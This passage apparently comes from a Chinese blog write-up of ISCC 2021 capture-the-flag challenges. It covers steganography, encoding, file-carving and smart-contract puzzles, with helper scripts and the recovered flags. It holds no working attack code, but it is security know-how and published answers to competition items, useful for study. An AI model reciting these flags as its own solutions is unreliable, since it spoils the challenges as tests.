[<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>]]  <span class="hljs-comment"># 得到五个点</span><br>plt.figure()  <span class="hljs-comment"># 得到画面</span><br>ax1 = plt.axes(projection=<span class="hljs-string">&#x27;3d&#x27;</span>)<br>ax1.set_xlim(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>)  <span class="hljs-comment"># X轴，横向向右方向</span><br>ax1.set_ylim(<span class="hljs-number">15</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># Y轴,左向与X,Z轴互为垂直</span><br>ax1.set_zlim(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>)  <span class="hljs-comment"># 竖向为Z轴</span><br>color1 = [<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>]<br>marker1 = [<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>]<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> dot1:<br>    ax1.scatter(x[<span class="hljs-number">0</span>], x[<span class="hljs-number">1</span>], x[<span class="hljs-number">2</span>], c=color1[<span class="hljs-number">1</span>],<br>                marker=marker1[<span class="hljs-number">1</span>], linewidths=<span class="hljs-number">4</span>)  <span class="hljs-comment"># 用散点函数画点</span><br>    i += <span class="hljs-number">1</span><br>plt.show()<br><br></code></pre></td></tr></table></figure><p>运行得到<br><img src="https://img-blog.csdnimg.cn/20210518192536935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>密码口令是<code>365728</code>，解压压缩包，得到pdf文档<br><img src="https://img-blog.csdnimg.cn/2021050114193340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>摩斯密码解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CONGRATULATIONTHEFLAGICHALLENGEISCCTWOZEROTWOONE<br></code></pre></td></tr></table></figure><p>根据提示最终flag为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ISCC&#123;congratulationtheflagischallengeiscctwozerotwoone&#125;<br></code></pre></td></tr></table></figure><h3 id="海市蜃楼-1"><a href="#海市蜃楼-1" class="headerlink" title="海市蜃楼-1"></a>海市蜃楼-1</h3><blockquote><p>题目描述： 或许你看到的只是海市蜃楼…</p></blockquote><p>下载附件，是个docx文档，看到了压缩包文件头PK<br><img src="https://img-blog.csdnimg.cn/20210501112349328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改后缀为zip，解压，在document.xml文件中找到flag<br><img src="https://img-blog.csdnimg.cn/20210501112248789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法二：<br>使用winrar在文件中搜索ISCC字符串<br><img src="https://img-blog.csdnimg.cn/20210506222625824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h3><p>参考：<a href="https://terminalcats.com/0x41414141-ctf-blockchain-sanity-check-400/">https://terminalcats.com/0x41414141-ctf-blockchain-sanity-check-400/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">pragma solidity ^0.7.0;  // 指定所需的编译器版本<br>//SPDX-License-Identifier: UNLICENSED<br><br>contract look_look &#123;<br>    <span class="hljs-keyword">function</span> sloc111() public pure returns (string memory)&#123;    //public智能合约外部和内部都可使用的方法<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><br>合约地址: 0x0ed72dfd4c63dd97df8fec07e5a6bba466c6adf5<br></code></pre></td></tr></table></figure><p>需要挂代理，访问<a href="https://rinkeby.etherscan.io/">https://rinkeby.etherscan.io/</a></p><p>第一次做智能合约方面的题，输入合约地址，然后点击Contract<br><img src="https://img-blog.csdnimg.cn/2021050620485295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Decompile ByteCode，到这就卡住了<br><img src="https://img-blog.csdnimg.cn/20210506205053606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>星期天打了个比赛，里面也有个区块链题-<a href="https://www.anquanke.com/post/id/242237#h3-4">AZ</a>。公链明文泄露<br><img src="https://img-blog.csdnimg.cn/20210526141613891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择UTF-8 查看,得到flag<br><img src="https://img-blog.csdnimg.cn/20210526141638578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="美人计"><a href="#美人计" class="headerlink" title="美人计"></a>美人计</h3><blockquote><p>题目描述：美人说的话里有解题提示，但是美人的话不能全信。</p></blockquote><p>我记得当时附件文档中有两个二维码，二维码内容还保存着，图片不见了，不知道怎么回事</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">第一个二维码：<br>U2FsdGVkX1/Ka+sScszwQkwhO+VLiJwV/<span class="hljs-number">6</span>IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu<br><span class="hljs-number">3</span>GuGWmPOtO27z8vNppD2D50fwsD+<span class="hljs-number">8</span>VWhdtW9J4cewYivH/Z/<span class="hljs-number">7</span>GoUvcJXJMrvf+vu<br>+CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE<br>+pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r/v5noP8=<br><br>第二个二维码：<br>U2FsdGVkX19eOY/pDh8+vPAcvfkLi1XLUneVzjLLOMul53sKK8UpobdCOiPIv4KE<br></code></pre></td></tr></table></figure><p>图片属性给的提示，AES加密，密钥是ISCC2021</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">Try</span> AES, <span class="hljs-keyword">and</span> you will get the flag. ISCC2021<br></code></pre></td></tr></table></figure><p>对第一个二维码内容，解了三次AES加密得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_!<br></code></pre></td></tr></table></figure><p>第二个二维码内容，进行AES解密发现不行，然后尝试DES解密结果成功了，得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ISCC&#123;be@uty_1ike<span class="hljs-variable">$_Y0u_2O2lISCC</span>&#125;<br></code></pre></td></tr></table></figure><p>再复现的时候，附件中就剩一张二维码了，把docx后缀转换成zip解压，出题人变狗了，把第二张二维码藏在这了，和上面的方法一样，得到flag<br><img src="https://img-blog.csdnimg.cn/2021051320345497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="我的折扣是多少"><a href="#我的折扣是多少" class="headerlink" title="我的折扣是多少"></a>我的折扣是多少</h3><blockquote><p>题目描述：<br>小c同学去参加音乐会，在官网买票时发现了有提示消息，提供给的有“give_me_discount”的压缩包，好奇的小c下载下来，但却无从下手，为了节省零花钱，你能帮帮他吗？</p></blockquote><p>命令行运行give.exe，得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pass1&#123;\u006b\u0072\u0077&#125;<br></code></pre></td></tr></table></figure><p>把中间的进行unicode转码得到：pass1{krw}</p><p>010打开me.zip，在末尾发现Base编码<br><img src="https://img-blog.csdnimg.cn/20210501162644856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码得到：pass2{gcc666}</p><p>所以压缩包口令为krwgcc666，解压得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eW91Zm91bmRtZT8=<br></code></pre></td></tr></table></figure><p>base64解码</p><p><img src="https://img-blog.csdnimg.cn/20210501163008756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后使用MP3Stego</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">decode -X -P youfoundme? discount.mp3<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210501163051980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base32解码，最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCC&#123;Yourdiscount2.15&#125;<br></code></pre></td></tr></table></figure><h3 id="海市蜃楼-2"><a href="#海市蜃楼-2" class="headerlink" title="海市蜃楼-2"></a>海市蜃楼-2</h3><p>foremost分离图片，得到加密的压缩包</p><p>由于这是组合题，所以要在海市蜃楼-1中去找线索。最终发现true.xml有猫腻，原来是jpg文件<br><img src="https://img-blog.csdnimg.cn/20210526091711997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改为jpg<br><img src="https://img-blog.csdnimg.cn/20210526091822427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>海市蜃楼-1的flag也有猫腻，结合flag和图片，最终得到压缩包的口令为zhongnanshan，解压海市蜃楼-2的压缩包<br><img src="https://img-blog.csdnimg.cn/20210526092109814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码得到一个网址，内容为<code>ZWFzeQ==</code>，base解码后为<code>easy</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://ctewm.com/aTvQcE/kva11w<br></code></pre></td></tr></table></figure><p>继续往下走，foremost分离图片得到压缩包，口令为easy</p><p><img src="https://img-blog.csdnimg.cn/20210526092546155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Hack-the-Victim"><a href="#Hack-the-Victim" class="headerlink" title="Hack the Victim"></a>Hack the Victim</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">Victim为含有漏洞的智能合约，在 Rinkeby测试网络的合约地址为：<br><span class="hljs-number">0x68D28fE315E6A344029D42915Fbc7af4261AB833</span><br>接口为：<br>contract Victim &#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">string</span> memory </span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ISCC&#123;xxxxx&#125;&quot;</span>;<br>&#125;<br>&#125;<br>请编写攻击合约，实现对 Victim 的攻击，获取 flag。<br></code></pre></td></tr></table></figure><p>合约地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://rinkeby.etherscan.io/address/0x68D28fE315E6A344029D42915Fbc7af4261AB833<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506204015536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>16进制转字符串<br><img src="https://img-blog.csdnimg.cn/20210506204048675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以直接点击Decompile ByteCode进行反编译<br><img src="https://img-blog.csdnimg.cn/20210526133856346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="检查一下"><a href="#检查一下" class="headerlink" title="检查一下"></a>检查一下</h3><blockquote><p>题目描述：你真的了解png文件的格式吗？</p></blockquote><p>用pngcheck检查一下图片，发现最后一个IDAT块异常<br><img src="https://img-blog.csdnimg.cn/20210517162639589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>010复制出来<br><img src="https://img-blog.csdnimg.cn/20210517162450658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用脚本解压zlib</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br>s = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">78 9C 5D 52 09 0E C0 20 0C FA 12 FC FF 73 CB 6A</span><br><span class="hljs-string">39 54 97 4C 7B 41 2B E4 2C 00 3C DF 7F 04 69 B3</span><br><span class="hljs-string">AC E7 CA D9 27 E4 37 1D 27 15 33 01 E3 91 75 AB</span><br><span class="hljs-string">9D F4 D7 29 F3 E2 AF 13 75 21 CC AC 69 3D BB C8</span><br><span class="hljs-string">0A 2F 8C E0 26 D0 25 F9 F4 62 A2 08 C5 0A A0 69</span><br><span class="hljs-string">90 35 0D 34 E1 39 8B 8B 2A 5D A0 CA DE B4 FE 23</span><br><span class="hljs-string">61 59 CB 60 3B EE DA 82 5E 2E 1E E2 46 15 D8 8D</span><br><span class="hljs-string">AE 46 33 54 95 23 8A AD 82 FD C0 F5 CC 86 2C 76</span><br><span class="hljs-string">69 1F 34 74 8D 5F 22 70 2B 86 8A CC FA 69 EA 6D</span><br><span class="hljs-string">A4 12 DC 99 A5 21 08 B9 27 5F F3 37 40 A4 8C AA</span><br><span class="hljs-string">E7 1A A5 BE F4 AB E2 A5 B3 68 21 23 C6 07 2E D4</span><br><span class="hljs-string">9F 5D E1 77 9E 9A</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>s = s.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>b = <span class="hljs-built_in">bytes</span>.fromhex(s)<br>flag = zlib.decompress(b)<br>print(flag)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1111111000100100110000111111110000010011011110010101000001101110100111010011010010111011011101000000111011110101110110111010010111101110001011101100000101110111000010010000011111111010101010101010111111100000000011100100110100000000100101101110000101010101000001101000011101011011011100101000001110010010001111011110010001100000101101100111111001010110101101110000100011110100110001001100010010101110000111111111110010100110101001111110010110001100110111110111000110011110010001111001110000100011010000110100100000001011001010101101110100011011010011100011101001111011111000101001101101101100101010001111101000000000011101101101010001011011111110000011110000101011010100000101011110010101000101101011101001010011001011111001010111010110101111000001101001101110100101010000010100111011000001000011101000011001001011111110100100100000111100110<br></code></pre></td></tr></table></figure><p>直接binwalk图片，也能得到同样的结果<br><img src="https://img-blog.csdnimg.cn/20210518191058101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>一共841位，猜测是29*29的二维码，直接使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>MAX = <span class="hljs-number">29</span><br>pic = Image.new(<span 